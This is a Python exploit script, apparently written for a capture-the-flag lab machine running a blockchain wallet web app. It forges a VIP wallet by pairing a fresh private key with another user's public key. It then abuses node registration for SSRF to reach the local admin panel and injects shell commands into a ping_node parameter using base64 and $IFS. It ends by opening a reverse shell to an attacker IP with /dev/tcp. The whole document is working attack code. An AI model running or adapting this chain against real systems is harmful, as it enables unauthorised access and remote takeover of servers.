#!/usr/bin/env python3
import base64
import html
import json
import re
from collections import defaultdict
from urllib.parse import urlencode

import requests

BASE = "http://10.129.XX.XX:8080"
VPN_IP = "10.10.17.121"  #

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"

# --- 1. Forge VIP wallet ---
response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "create", "filename": "fresh"},
    timeout=20,
)
response.raise_for_status()
fresh_wallet = response.json()

chain = session.get(f"{BASE}/blockchain", timeout=20).json()
balances = defaultdict(int)

for block in chain:
    for transaction in block.get("data", []):
        if not isinstance(transaction, dict) or "amount" not in transaction:
            continue
        amount = int(transaction["amount"])
        sender = transaction.get("sender")
        receiver = transaction.get("receiver")
        if receiver:
            balances[receiver] += amount
        if sender and sender != "Blockchain_Reward":
            balances[sender] -= amount

vip_public_key, vip_balance = max(balances.items(), key=lambda item: item[1])
assert vip_balance >= 10, "No VIP-capable historical wallet found"

forged_wallet = {
    "private_key": fresh_wallet["private_key"],
    "public_key": vip_public_key,
}

response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "load"},
    files={"file": ("forged_wallet.json", json.dumps(forged_wallet), "application/json")},
    timeout=20,
)
response.raise_for_status()
assert "Wallet loaded successfully" in response.text
print(f"[+] VIP wallet loaded (balance={vip_balance})")


# --- 2. Node registration / SSRF helpers ---
def register_node(url):
    response = session.post(
        f"{BASE}/dashboard/vip/nodes",
        data={"action": "register", "node": url},
        timeout=20,
    )
    response.raise_for_status()


def find_node_id(url):
    page = session.get(f"{BASE}/dashboard/vip/nodes", timeout=20).text
    pairs = [
        (html.unescape(value), node_id)
        for value, node_id in re.findall(
            r'title="([^"]+)".*?testNode\(\'([0-9]+)\'\)',
            page,
            re.S,
        )
    ]
    for value, node_id in reversed(pairs):
        if value.strip() == url.strip():
            return node_id
    raise RuntimeError(
        f"Could not find registered node {url!r}. "
        f"Available nodes: {[v for v, _ in pairs]!r}"
    )


def test_node(url):
    node_id = find_node_id(url)
    response = session.get(
        f"{BASE}/dashboard/vip/nodes/test_node/{node_id}",
        timeout=60,
    )
    response.raise_for_status()
    return response.text


admin_url = "http://0.0.0.0:8080/admin"
register_node(admin_url)
assert "Admin Dashboard" in test_node(admin_url)
print("[+] Local administrator panel reached through SSRF")


# --- 3. Command injection via ping_node ---
def execute_as_walter(command):
    encoded = base64.b64encode(command.encode()).decode()

    command_node = (
        "http://foo&echo$IFS''"
        + encoded
        + "|base64$IFS''-d|bash&@"
        + VPN_IP
        + ":18083/"
    )
    register_node(command_node)

    internal_action = (
        "http://0.0.0.0:8080/admin/nodes/manage?"
        + urlencode({"action": "ping_node", "target": command_node})
    )
    register_node(internal_action)

    body = test_node(internal_action)
    outputs = [
        html.unescape(value).strip()
        for value in re.findall(r"<pre[^>]*>(.*?)</pre>", body, re.S)
        if html.unescape(value).strip()
    ]
    return "\n".join(outputs)


print("[*] Attempting command execution as walter...")
print(execute_as_walter("hostname; sh -i >& /dev/tcp/10.10.XX.XXX/4444 0>&1"))